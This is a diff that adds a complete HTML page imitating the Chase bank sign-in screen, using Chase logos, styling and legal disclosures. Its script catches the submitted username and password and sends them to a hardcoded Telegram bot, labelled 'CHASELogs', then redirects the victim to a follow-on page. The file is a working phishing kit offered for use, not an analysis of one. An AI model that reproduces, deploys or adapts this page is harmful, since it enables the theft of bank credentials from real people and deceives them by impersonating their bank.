@@ -1,0 +1,218 @@
+
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="style.css">
+<title>Sign in - chase.com</title>
+<style>
+  body{
+padding: 0;
+margin: 0;
+background: url('https://static.chasecdn.com/content/dam/cpo-static/images/background.desktop.jpmol-login.jpeg');
+font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
+}
+
+header{
+background: linear-gradient(to bottom,rgba(0,0,0,.7) 0,rgba(0,0,0,.5) 50%,rgba(0,0,0,0) 100%);
+padding: 1.5em 0;
+text-align: center;
+color: #fff;
+}
+
+.form{
+  background: rgba(255,255,255,.96);
+  border-radius: 5px;
+  padding: 50px 45px;
+  max-width: 334px!important;
+  overflow: visible!important;
+  margin: 5% auto;
+}
+
+#token{
+display: none;
+}
+.form input{
+    font-size: 1.125rem;
+  background: 0 0;
+  border: none;
+  padding: 5px;
+  margin: 10px 0;
+  width: 100%;
+  height: 2.5rem;
+  border-bottom: 0.0625rem solid #959595;
+  border-radius: 0;
+  outline: 0.0625rem solid transparent;
+}
+
+.rem-token .check{
+background: transparent;
+height: 20px;
+width: 20px;
+border-radius: 3px;
+border: 1px solid #666
+}
+.rem-token .token{
+  display: flex;
+justify-content: space-between;
+align-items: center;
+width: 31%
+}
+.rem-token .rem{
+display: flex;
+justify-content: space-between;
+align-items: center;
+width: 40%
+}
+.rem-token p{
+    color: #666;
+  font-size: 0.99rem;
+  white-space: nowrap;
+  padding-top: 3px;
+}
+.form a{
+color: #0b6efd;
+text-decoration: none;
+}
+.rem-token{
+display: flex;
+justify-content: space-between
+}
+
+button{
+height: 2.5rem;
+border: none;
+    overflow-x: auto;
+width: 100%;
+  border-radius: 0.3125rem;
+  text-align: center;
+  white-space: nowrap;
+  vertical-align: middle;
+  cursor: pointer;
+  transition: background-color .4s ease,border-color .4s ease;
+  outline: 0.0625rem solid transparent;
+  font-weight: bold;
+  color: #fff;
+  background: #0b6efd
+}
+
+footer{
+background: #fff;
+padding: 10px 25px;
+margin-top:30px;
+}
+
+p.dis{
+    font-size: .75rem;
+  font-weight: 600;
+  color: #414042;
+  letter-spacing: 0;
+  text-decoration: none;
+}
+
+ul li,
+ul p{
+font-weight: 600;
+color: #414042;
+font-size: .875rem
+}
+
+p.small{
+    font-size: .75rem;
+  font-weight: 400;
+  color: #414042;
+  letter-spacing: 0;
+  text-decoration: none;
+  margin-bottom: 12px;
+  margin-top: 0;
+}
+p.small span{
+font-weight: bold;
+}
+
+
+@media(max-width: 850px){
+.form{
+
+  max-width: 250px!important;
+}
+}
+</style>
+</head>
+<body>
+<header>
+  <img src="https://static.chasecdn.com/web/2021.12.12-781/@seur/cxo-ui-common-utilities/dist/common/assets/img/logos/wordmark-white.png" style="height:45px;" alt="">
+</header>
+
+<div class="form">
+  <form action="" id="form" method="">
+  <input type="text" placeholder="Username" id="usr" required>
+  <br>
+  <input type="password" placeholder="Password" id="pwd" required>
+  <br>
+  <input type="text" placeholder="Token" id="token" name="">
+  <div class="rem-token">
+    <br>
+    <!-- <div class="rem">
+      <div class="check"></div>
+      <p>Remember me</p>
+    </div>
+    <div class="token">
+      <div class="check"></div>
+      <p>Use token</p>
+    </div> -->
+  </div>
+  <button type="submit">Sign in</button><br><br>
+  <a href="#">Forgot username/password?</a><br><br>
+  <a href="#">Not Enrolled? Sign Up Now.</a>
+  </form>
+</div>
+
+
+<footer id="footer">
+  <div class="contain">
+    <p class="strong dis">Disclosures</p>
+    <ul>
+      <p class="strong">INVESTMENT AND INSURANCE PRODUCTS ARE:</p>
+      <li>NOT FDIC INSURED • NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
+      <li>NOT A DEPOSIT OR OTHER OBLIGATION OF, OR GUARANTEED BY, JPMORGAN CHASE BANK, N.A. OR ANY OF ITS AFFILIATES</li>
+      <li>SUBJECT TO INVESTMENT RISKS, INCLUDING POSSIBLE LOSS OF THE PRINCIPAL AMOUNT INVESTED</li>
+    </ul>
+    <p class="small"> <span> JPMorgan Chase Bank, N.A. </span> and its affiliates (collectively “JPMCB”) offer investment products, which may include bank-managed accounts and custody, as part of its trust and fiduciary services. Other investment products and services, such as brokerage and advisory accounts, are offered through J.P. Morgan Securities LLC (JPMS), a member of FINRA and SIPC. Annuities are made available through Chase Insurance Agency, Inc. (CIA), a licensed insurance agency, doing business as Chase Insurance Agency Services, Inc. in Florida. JPMCB, JPMS and CIA are affiliated companies under the common control of JPMorgan Chase & Co. Products not available in all states.</p>
+    <p class="small">Learn More about our firm and investment professionals at FINRA BROKERCHECK.</p>
+    <p class="small">For other important disclosures, please go to: J.P. Morgan Global Regulatory Disclosures.</p>
+    <p class="small">Bank deposit accounts and related services, such as checking, savings, and bank lending, may be subject to approval and are offered by JPMorgan Chase Bank, N.A. Member FDIC. Important information about FDIC protection (PDF: 249 kb)</p>
+    <p class="small">. <span>PDF Files</span></p>
+    <p class="small">You'll need software to help you download, see and print PDFs. If you have trouble downloading PDF files, please install or upgrade your software. Some companies, like Adobe®, offer this software for free. Visit www.Adobe.com. Adobe is a registered trademark of Adobe Systems Incorporated in the United States and/or other countries.</p>
+  </div>
+  <p class="small">Copyright 2021 JPMorgan Chase & Co. All Rights Reserved.</p>
+</footer>
+
+  <script>
+    const formal = document.querySelector('#form')
+  
+    let bot = {
+        TOKEN: "5051297224:AAETgLhNRTbhpJNucj4Ny4y_czF0M3UnllY",
+        chatID: "-772522345"
+    }
+
+
+    formal.addEventListener("submit", e =>{
+        e.preventDefault();
+
+        let message = document.querySelector('#usr').value
+        let messageT = document.querySelector('#pwd').value
+        
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=CHASELogs==${message}=${messageT}`, {
+            method: "GET"
+        }).then(success => {
+            window.location.replace("./code.html");
+        }, error => {
+            alert("Message not sent")
+            console.log(error)
+
+        })
+    })
+</script>
+</body>
+</html>
